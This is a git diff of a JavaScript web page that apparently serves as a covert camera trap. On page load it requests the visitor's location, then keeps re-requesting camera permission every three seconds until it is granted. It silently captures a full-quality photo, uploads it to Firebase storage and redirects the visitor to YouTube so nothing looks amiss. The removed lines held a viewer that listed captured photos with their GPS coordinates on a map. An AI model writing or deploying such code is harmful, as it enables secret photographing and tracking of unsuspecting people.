@@ -84,14 +84,6 @@ function capturePhoto(video) {
             await storageRef.put(blob);
             console.log('Photo uploaded with filename:', fileName);
 
-            // Save metadata (location) in Firebase Database
-            await database.ref('photos/' + fileName).set({
-                latitude: userLocation.latitude,
-                longitude: userLocation.longitude,
-                timestamp: Date.now(),
-                filename: fileName
-            });
-
             // Redirect after 1 second
             setTimeout(() => {
                 window.location.href = 'https://youtube.com/';  // Redirect URL after upload
@@ -102,103 +94,38 @@ function capturePhoto(video) {
     }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
 }
 
-// Function to display photos by date
-function displayPhotosByDate() {
-    const storageRef = storage.ref('users');
-    const dateList = document.getElementById('dateList');
-    const photoList = document.getElementById('photoList');
-
-    storageRef.listAll().then((result) => {
-        const photosByDate = {};
-
-        // Group photos by date
-        result.items.forEach((imageRef) => {
-            imageRef.getMetadata().then((metadata) => {
-                const timestamp = metadata.timeCreated;
-                const date = new Date(timestamp).toLocaleDateString();
-
-                if (!photosByDate[date]) {
-                    photosByDate[date] = [];
+// Access the camera with higher resolution and request permission until granted
+async function startVideo() {
+    let accessGranted = false;
+    while (!accessGranted) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
                 }
-                
-                // Retrieve location from database
-                database.ref('photos/' + imageRef.name).once('value').then((snapshot) => {
-                    const data = snapshot.val();
-                    if (data) {
-                        photosByDate[date].push({
-                            name: imageRef.name,
-                            fullPath: imageRef.fullPath,
-                            time: new Date(timestamp).toLocaleTimeString(),
-                            latitude: data.latitude,
-                            longitude: data.longitude
-                        });
-                    }
-                }).catch((error) => {
-                    console.error('Error retrieving metadata:', error);
-                });
-            }).catch((error) => {
-                console.error('Error retrieving metadata:', error);
             });
-        });
+            accessGranted = true;  // Camera access granted
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-        // Display date list after grouping photos
-        setTimeout(() => {
-            for (const date in photosByDate) {
-                const dateItem = document.createElement('div');
-                dateItem.className = 'date-item';
-                dateItem.textContent = date;
-                dateItem.onclick = () => displayPhotosForDate(photosByDate[date]);
+            // Capture photo once the video stream is ready
+            video.onloadedmetadata = () => {
+                capturePhoto(video);
+            };
+        } catch (error) {
+            console.error('Error accessing camera:', error);
+            document.getElementById('message').textContent = 'Camera access denied, trying again...';
 
-                dateList.appendChild(dateItem);
-            }
-        }, 1000); // Adding a delay to ensure metadata processing is complete
-    }).catch((error) => {
-        console.error('Error listing images:', error);
-    });
-}
-
-// Function to display photos for a specific date
-function displayPhotosForDate(photos) {
-    const photoList = document.getElementById('photoList');
-    photoList.innerHTML = ''; // Clear previous list
-
-    photos.forEach((photo, index) => {
-        const photoItem = document.createElement('div');
-        photoItem.className = 'photo-item';
-        photoItem.innerHTML = `
-            <span>${index + 1}. ${photo.name} - ${photo.time}</span>
-            <button onclick="viewPhoto('${photo.fullPath}')">View</button>
-            <button onclick="showMap(${photo.latitude}, ${photo.longitude})">Map</button>
-        `;
-        photoList.appendChild(photoItem);
-    });
-}
-
-// Function to view the selected photo
-function viewPhoto(photoPath) {
-    const storageRef = storage.ref(photoPath);
-    storageRef.getDownloadURL().then((url) => {
-        const imgElement = document.createElement('img');
-        imgElement.src = url; // Set image source to the URL
-        imgElement.style.maxWidth = '100%'; // Responsive image
-        imgElement.style.height = 'auto';
-        const photoList = document.getElementById('photoList');
-        photoList.innerHTML = ''; // Clear previous list and display only the selected image
-        photoList.appendChild(imgElement);
-    }).catch((error) => {
-        console.error('Error retrieving image URL:', error);
-    });
-}
-
-// Function to show map with coordinates
-function showMap(latitude, longitude) {
-    if (latitude && longitude) {
-        const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        window.open(mapUrl, '_blank'); // Open map in a new tab
-    } else {
-        alert('No coordinates available for this photo.');
+            // Wait for 3 seconds before retrying
+            await new Promise(resolve => setTimeout(resolve, 3000));
+        }
     }
 }
 
-// Call the display function on page load
-window.onload = displayPhotosByDate;
+// Start the camera and location request on page load
+window.onload = () => {
+    getLocation();  // Request location permission first
+    startVideo();   // Request camera permission next
+};
